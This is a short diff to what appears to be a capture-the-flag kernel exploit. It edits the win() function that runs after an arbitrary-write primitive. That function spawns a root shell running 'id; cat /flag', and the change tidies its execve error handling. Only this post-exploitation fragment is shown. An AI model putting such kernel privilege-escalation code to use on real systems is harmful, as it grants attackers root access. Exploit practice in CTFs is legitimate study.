@@ -62,10 +62,10 @@ void trigger_vuln_arb_write(uint64_t addr, const std::vector<uint8_t>& data) {
 void win() {
     puts("[+] Returned from kernel");
     puts("[+] Testing access as root:");
-    const char *sh_args[] = {"sh", "-c", "id; cat /flag; sleep 1"};
+    const char *sh_args[] = {"sh", "-c", "id; cat /flag"};
     int ret = execve("/bin/sh", (char**)sh_args, NULL);
-    puts("[-] Still running after execve...");
-    printf("[-] execve ret = %d, errno = %d\n", ret, errno);
+    printf("[-] execve failed ret = %d, errno = %d\n", ret, errno);
+    _exit(1);
 }
 
 int main(int argc, const char** argv) {
